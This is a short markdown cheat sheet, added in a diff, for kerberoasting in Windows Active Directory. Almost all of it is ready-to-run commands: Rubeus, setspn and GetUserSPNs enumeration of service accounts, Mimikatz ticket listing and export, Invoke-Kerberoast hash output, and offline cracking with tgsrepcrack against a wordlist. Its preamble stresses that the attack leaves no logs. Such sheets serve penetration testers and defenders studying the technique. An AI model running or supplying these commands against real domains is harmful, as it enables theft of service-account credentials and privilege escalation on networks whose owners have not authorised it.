@@ -1,0 +1,31 @@
+# Windows Kerberos Privesc
+
+## Simple logic for kerberoast is requesting tickets and cracking them(offline, doesn’t produce any logs)
+## – For kerberos to work, times have to be within 5 minutes between attacker and victim.
+
+# Rubeus 
+.\.rubeus.exe kerberoast /creduser:ecorp\morph3 /credpassword:pass1234
+
+# List available tickets
+setspn.exe -t evil.corp -q */*
+powershell.exe -exec bypass -c "Import-Module .\GetUserSPNs.ps1"
+cscript.exe GetUserSPNs.ps1
+
+# List cached tickets
+Invoke-Mimikatz -Command '"kerberos::list"'
+powershell.exe -c "klist"
+powershell.exe -c "Import-Module C:\Users\Public\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command '"kerberos::list"'"
+
+# Request tickets 
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
+
+# Requesting remotely
+python GetUserSPNs.py -request ECORP/morph3:supersecurepassword@127.0.0.1
+
+# Extract tickets
+powershell.exe -c "Import-Module C:\Users\Public\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat Hashcat"
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+
+# Crack Tickets
+python tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi
